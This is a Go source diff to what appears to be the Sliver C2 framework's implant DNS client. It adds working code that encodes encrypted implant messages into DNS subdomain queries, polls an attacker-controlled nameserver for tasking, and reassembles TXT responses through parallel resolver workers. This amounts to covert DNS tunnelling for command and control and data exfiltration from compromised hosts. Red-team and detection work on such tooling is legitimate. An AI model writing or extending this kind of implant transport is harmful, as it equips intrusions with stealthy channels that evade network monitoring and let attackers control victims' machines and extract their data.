@@ -19,34 +19,35 @@ package dnsclient
 
 --------------------------------------------------------------------------
 
-*** BASE32 ***
-DNS domains are limited to 254 characters including '.' so that means
-Base 32 encoding, so (n*8 + 4) / log2(32) = 63 means we can encode 39 bytes
-per subdomain.
+	*** BASE32 ***
+	DNS domains are limited to 254 characters including '.' so that means
+	Base 32 encoding, so (n*8 + 4) / log2(32) = 63 means we can encode 39 bytes
+	per subdomain.
 
-Format: (subdata...).<ns domain>.<parent domain>
-	[63].[63]...[ns].[parent].
+	Format: (subdata...).<ns domain>.<parent domain>
+		[63].[63]...[ns].[parent].
 
-254 - len(parent) = subdata space, 128 is our worst case where the parent domain is 126 chars,
-where [63 NS . 63 TLD], so 128 / 63 = 2 * 39 bytes = 78 bytes, worst case per query
+	254 - len(parent) = subdata space, 128 is our worst case where the parent domain is 126 chars,
+	where [63 NS . 63 TLD], so 128 / 63 = 2 * 39 bytes = 78 bytes, worst case per query
 
-We need to include some metadata in each request:
-	Type = 2 bytes max
-	ID = 4 bytes max
-	Index = 4 bytes max
-	Size = 4 bytes max
-	Data = 78 - (2+4+4+4) ~= 64 bytes worst case
+	We need to include some metadata in each request:
+		Type = 2 bytes max
+		ID = 4 bytes max
+		Start = 4 bytes max
+		Stop = 4 bytes max
+		Size = 4 bytes max
+		Data = 78 - (2+4+4+4+4) ~= 60 bytes per query worst case
 
-*** BASE58 ***
-Base58 ~2% less efficient than Base64, but we can't use all 64 chars in DNS so
-it's just not an option, we could potentially use some type of Base62 encoding
-but those implementations are more complex and only marginally more efficient
-than Base58, and Base58 avoids any complexities with '-' in domain names.
+	*** BASE58 ***
+	Base58 ~2% less efficient than Base64, but we can't use all 64 chars in DNS so
+	it's just not an option, we could potentially use some type of Base62 encoding
+	but those implementations are more complex and only marginally more efficient
+	than Base58, and Base58 avoids any complexities with '-' in domain names.
 
-The idea is that since the server returns the messages CRC32 checksum we can detect
-when the message is transparently corrupted by some rude resolver. So when we init
-the session we send a few messages with random data to see if we can use Base58, and
-fallback to Base32 if we detect problems.
+	The idea is that since the server returns the messages CRC32 checksum we can detect
+	when the message is transparently corrupted by some rude resolver. So when we init
+	the session we send a few messages with random data to see if we can use Base58, and
+	fallback to Base32 if we detect problems.
 */
 
 // {{if .Config.DNSc2Enabled}}
@@ -79,6 +80,7 @@ const (
 	sessionIDBitMask = 0x00ffffff // Bitwise mask to get the dns session ID
 	metricsMaxSize   = 8
 	shaveMargin      = 20 // Max metadata *should* be 18 bytes, but I added extra margin
+	queueBufSize     = 512
 )
 
 var (
@@ -87,6 +89,8 @@ var (
 	errNoResolvers         = errors.New("{{if .Config.Debug}}No resolvers found{{end}}")
 	ErrTimeout             = errors.New("{{if .Config.Debug}}DNS Timeout{{end}}")
 	ErrClosed              = errors.New("dns session closed")
+	ErrInvalidResponse     = errors.New("invalid response")
+	ErrInvalidIndex        = errors.New("invalid start/stop index")
 )
 
 // DNSStartSession - Attempt to establish a connection to the DNS server of 'parent'
@@ -96,7 +100,7 @@ func DNSStartSession(parent string, retryWait time.Duration, timeout time.Durati
 	// {{end}}
 	client := &SliverDNSClient{
 		metadata:     map[string]*ResolverMetadata{},
-		parent:       "." + strings.TrimPrefix(parent, "."),
+		parent:       strings.TrimSuffix("."+strings.TrimPrefix(parent, "."), ".") + ".",
 		forceBase32:  false, // Force case insensitive encoding
 		queryTimeout: timeout,
 		retryWait:    retryWait,
@@ -105,10 +109,10 @@ func DNSStartSession(parent string, retryWait time.Duration, timeout time.Durati
 
 		// 254 is the max domain length, subtract parent length, and
 		// then subtract the max number of dots we need for subdomains
+		// dots is calculated as 63 chars + 1 dot (64 chars)
 		subdataSpace: 254 - len(parent) - ((254 - len(parent)) / 64),
-
-		base32: encoders.Base32{},
-		base58: encoders.Base58{},
+		base32:       encoders.Base32{},
+		base58:       encoders.Base58{},
 	}
 	err := client.SessionInit()
 	if err != nil {
@@ -130,11 +134,69 @@ type SliverDNSClient struct {
 	forceBase32  bool
 	subdataSpace int
 	dnsSessionID uint32
+	msgCount     uint32
 	closed       bool
 
-	cipherCtx *cryptography.CipherContext
-	base32    encoders.Base32
-	base58    encoders.Base58
+	cipherCtx   *cryptography.CipherContext
+	workerPool  []*DNSWorker
+	workerIndex int
+	base32      encoders.Base32
+	base58      encoders.Base58
+}
+
+// DNSWork - Single unit of work for DNSWorker
+type DNSWork struct {
+	QueryType uint16
+	Domain    string
+	Results   chan *DNSResult
+}
+
+// DNSResult - Result of a DNSWork unit
+type DNSResult struct {
+	Data []byte
+	Err  error
+}
+
+// DNSWorker - Used for parallel send/recv
+type DNSWorker struct {
+	resolver DNSResolver
+	Metadata *ResolverMetadata
+	Queue    chan *DNSWork
+	Ctrl     chan struct{} // Tells the worker to exit
+}
+
+// Start - Starts with worker with a given queue
+func (w *DNSWorker) Start(id int) {
+	defer close(w.Queue)
+	go func() {
+		// {{if .Config.Debug}}
+		log.Printf("[dns] starting worker #%d", id)
+		// {{end}}
+		var work *DNSWork
+		for {
+			select {
+			case work = <-w.Queue:
+			case <-w.Ctrl:
+				w.Ctrl <- struct{}{}
+				return
+			}
+
+			switch work.QueryType {
+			case dns.TypeA:
+				data, _, err := w.resolver.A(work.Domain)
+				if work.Results != nil {
+					work.Results <- &DNSResult{data, err}
+					close(work.Results)
+				}
+			case dns.TypeTXT:
+				data, _, err := w.resolver.TXT(work.Domain)
+				if work.Results != nil {
+					work.Results <- &DNSResult{data, err}
+					close(work.Results)
+				}
+			}
+		}
+	}()
 }
 
 // ResolverMetadata - Metadata for the resolver
@@ -196,7 +258,12 @@ func (s *SliverDNSClient) SessionInit() error {
 	} else {
 		encoder = s.base32
 	}
-	respData, err := s.serialSend(resolver, encoder, dnspb.DNSMessageType_SESSION_INIT, initData)
+	initMsg := &dnspb.DNSMessage{
+		ID:   s.nextMsgID(),
+		Type: dnspb.DNSMessageType_INIT,
+		Size: uint32(len(initData)),
+	}
+	respData, err := s.serialSend(resolver, encoder, initMsg, initData)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[dns] init msg send failure %v", err)
@@ -222,6 +289,20 @@ func (s *SliverDNSClient) SessionInit() error {
 	log.Printf("[dns] key exchange was successful!")
 	// {{end}}
 
+	// {{if .Config.Debug}}
+	log.Printf("[dns] starting worker(s) ...")
+	// {{end}}
+	for id, resolver := range s.resolvers {
+		worker := &DNSWorker{
+			resolver: resolver,
+			Metadata: s.metadata[resolver.Address()],
+			Queue:    make(chan *DNSWork, queueBufSize),
+			Ctrl:     make(chan struct{}),
+		}
+		s.workerPool = append(s.workerPool, worker)
+		worker.Start(id)
+	}
+	s.closed = false
 	return nil
 }
 
@@ -230,7 +311,26 @@ func (s *SliverDNSClient) WriteEnvelope(envelope *pb.Envelope) error {
 	if s.closed {
 		return ErrClosed
 	}
-	return nil
+	envelopeData, err := proto.Marshal(envelope)
+	if err != nil {
+		return err
+	}
+
+	msgID := s.nextMsgID()
+	resolver, meta := s.randomResolver()
+	var encoder encoders.Encoder
+	if meta.EnableBase58 {
+		encoder = s.base58
+	} else {
+		encoder = s.base32
+	}
+	sendMsg := &dnspb.DNSMessage{
+		ID:   msgID,
+		Type: dnspb.DNSMessageType_DATA_FROM_IMPLANT,
+		Size: uint32(len(envelopeData)),
+	}
+	_, err = s.serialSend(resolver, encoder, sendMsg, envelopeData)
+	return err
 }
 
 // ReadEnvelope - Recv an envelope from the server
@@ -238,41 +338,143 @@ func (s *SliverDNSClient) ReadEnvelope() (*pb.Envelope, error) {
 	if s.closed {
 		return nil, ErrClosed
 	}
-	return nil, nil
+
+	resolver, meta := s.randomResolver()
+	pollMsg, err := s.pollMsg(meta)
+	if err != nil {
+		return nil, err
+	}
+	domain, err := s.joinSubdata(pollMsg)
+	if err != nil {
+		return nil, err
+	}
+	respData, _, err := resolver.TXT(domain)
+	if err != nil {
+		return nil, err
+	}
+	if len(respData) < 1 {
+		return nil, nil // No pending envelopes
+	}
+
+	dnsMsg := &dnspb.DNSMessage{}
+	err = proto.Unmarshal(respData, dnsMsg)
+	if err != nil {
+		return nil, err
+	}
+	if dnsMsg.Type != dnspb.DNSMessageType_MANIFEST {
+		return nil, ErrInvalidResponse
+	}
+	envelope, err := s.parallelRecv(dnsMsg)
+	if err != nil {
+		return nil, err
+	}
+	return envelope, err
+}
+
+func (s *SliverDNSClient) Close() error {
+	s.closed = true
+	for _, worker := range s.workerPool {
+		worker.Ctrl <- struct{}{}
+	}
+	return nil
 }
 
 // serialSend - send a message serially (generally only used for init)
-func (s *SliverDNSClient) serialSend(resolver DNSResolver, encoder encoders.Encoder, msgType dnspb.DNSMessageType, data []byte) ([]byte, error) {
-	msg := &dnspb.DNSMessage{
-		ID:   s.msgID(0),
-		Type: msgType,
-		Size: uint32(len(data)),
-	}
-
+func (s *SliverDNSClient) serialSend(resolver DNSResolver, encoder encoders.Encoder, msg *dnspb.DNSMessage, data []byte) ([]byte, error) {
 	allSubdata, err := s.splitBuffer(msg, encoder, s.subdataSpace, data)
 	if err != nil {
 		return nil, err
 	}
+	resp := []byte{}
 	for _, subdata := range allSubdata {
-		_, _, err := resolver.TXT(subdata)
+		respData, _, err := resolver.TXT(subdata)
 		if err != nil {
 			// {{if .Config.Debug}}
 			log.Printf("[dns] init msg failure %v", err)
 			// {{end}}
 			return nil, err
 		}
+		if 0 < len(respData) {
+			resp = append(resp, respData...)
+		}
 	}
-	return nil, nil
+	return resp, nil
 }
 
-func (s *SliverDNSClient) send(data []byte) error {
+// func (s *SliverDNSClient) parallelSend(data []byte) error {
+// 	msgID := s.randomMsgID()
 
-	return nil
+// 	return nil
+// }
+
+func (s *SliverDNSClient) parallelRecv(manifest *dnspb.DNSMessage) (*pb.Envelope, error) {
+	if manifest.Type != dnspb.DNSMessageType_MANIFEST {
+		return nil, ErrInvalidResponse
+	}
+
+	const bytesPerTxt = 182 // 189 with base64, -6 metadata, -1 margin
+	results := []chan *DNSResult{}
+	for index := uint32(0); index < manifest.Size; index += bytesPerTxt {
+		if manifest.Size < index {
+			index = manifest.Size
+		}
+		stop := index + bytesPerTxt
+		if manifest.Size < index {
+			index = stop
+		}
+		recvMsg, _ := proto.Marshal(&dnspb.DNSMessage{
+			ID:    manifest.ID,
+			Type:  dnspb.DNSMessageType_DATA_TO_IMPLANT,
+			Start: index,
+			Stop:  stop,
+		})
+		// This message will always fit in base32
+		subdata, err := s.joinSubdata(string(s.base32.Encode(recvMsg)))
+		if err != nil {
+			return nil, err
+		}
+		workerResult := make(chan *DNSResult, 1)
+		worker := s.nextWorker()
+		worker.Queue <- &DNSWork{
+			QueryType: dns.TypeTXT,
+			Domain:    subdata,
+			Results:   workerResult,
+		}
+		results = append(results, workerResult)
+	}
+
+	recvDataBuf := make([]byte, 0, manifest.Size)
+	for _, result := range results {
+		dnsResult := <-result
+		if dnsResult.Err != nil {
+			return nil, dnsResult.Err
+		}
+		recvMsg := &dnspb.DNSMessage{}
+		err := proto.Unmarshal(dnsResult.Data, recvMsg)
+		if err != nil {
+			return nil, err
+		}
+		if recvMsg.Type != dnspb.DNSMessageType_DATA_TO_IMPLANT {
+			return nil, ErrInvalidResponse
+		}
+		if manifest.Size < recvMsg.Start || int(manifest.Size) < int(recvMsg.Start)+len(recvMsg.Data) {
+			return nil, ErrInvalidIndex
+		}
+		copy(recvDataBuf[recvMsg.Start:], recvMsg.Data)
+	}
+
+	plaintext, err := s.cipherCtx.Decrypt(recvDataBuf)
+	if err != nil {
+		return nil, err
+	}
+	envelope := &pb.Envelope{}
+	err = proto.Unmarshal(plaintext, envelope)
+	return envelope, err
 }
 
-func (s *SliverDNSClient) recv() ([]byte, error) {
-
-	return nil, nil
+func (s *SliverDNSClient) nextWorker() *DNSWorker {
+	s.workerIndex++
+	return s.workerPool[s.workerIndex%len(s.workerPool)]
 }
 
 // There's probably a fancy way to calculate this with math and shit but it's much easier to just encode bytes
@@ -283,7 +485,7 @@ func (s *SliverDNSClient) splitBuffer(msg *dnspb.DNSMessage, encoder encoders.En
 	stop := start
 	var encoded string
 	for index := 0; stop < len(data); index++ {
-		msg.Index = uint32(index)
+		msg.Start = uint32(index)
 		stop += (maxLength - shaveMargin) // MaxLength - max length of pb metadata
 		if len(data) < stop {
 			stop = len(data) - 1 // make sure the loop is executed at least once
@@ -310,6 +512,9 @@ func (s *SliverDNSClient) splitBuffer(msg *dnspb.DNSMessage, encoder encoders.En
 		subdata = append(subdata, domain)
 		start = stop
 	}
+	// {{if .Config.Debug}}
+	log.Printf("[dns] split subdata: %v", subdata)
+	// {{end}}
 	return subdata, nil
 }
 
@@ -318,7 +523,7 @@ func (s *SliverDNSClient) getDNSSessionID() error {
 	if err != nil {
 		return err
 	}
-	otpDomain, err := s.joinSubdata(string(s.base32.Encode(otpMsg)))
+	otpDomain, err := s.joinSubdata(otpMsg)
 	if err != nil {
 		return err
 	}
@@ -375,17 +580,32 @@ func (s *SliverDNSClient) joinSubdata(subdata string) (string, error) {
 	return domain, nil
 }
 
-func (s *SliverDNSClient) otpMsg() ([]byte, error) {
+func (s *SliverDNSClient) pollMsg(meta *ResolverMetadata) (string, error) {
+	pollMsg, _ := proto.Marshal(&dnspb.DNSMessage{
+		Type: dnspb.DNSMessageType_POLL,
+	})
+	if meta.EnableBase58 {
+		return string(s.base58.Encode(pollMsg)), nil
+	} else {
+		return string(s.base32.Encode(pollMsg)), nil
+	}
+}
+
+func (s *SliverDNSClient) otpMsg() (string, error) {
 	otpCode := cryptography.GetOTPCode()
 	otp, err := strconv.Atoi(otpCode)
 	if err != nil {
-		return nil, err
+		return "", err
 	}
 	otpMsg := &dnspb.DNSMessage{
 		Type: dnspb.DNSMessageType_TOTP,
 		ID:   uint32(otp), // Take advantage of the variable length encoding
 	}
-	return proto.Marshal(otpMsg)
+	data, err := proto.Marshal(otpMsg)
+	if err != nil {
+		return "", err
+	}
+	return string(s.base32.Encode(data)), nil
 }
 
 // fingerprintResolver - Fingerprints resolve to determine if we can use a case sensitive encoding
@@ -510,6 +730,11 @@ func (s *SliverDNSClient) fingerprintMsg(id int) ([]byte, uint32, error) {
 // msgID - Combine (bitwise-OR) DNS session ID with message ID
 func (s *SliverDNSClient) msgID(id uint32) uint32 {
 	return uint32(id<<24) | uint32(s.dnsSessionID)
+}
+
+func (s *SliverDNSClient) nextMsgID() uint32 {
+	s.msgCount++
+	return s.msgID(s.msgCount % 255)
 }
 
 // WARNING: The metrics map is not mutex'd so you cannot modify it in this
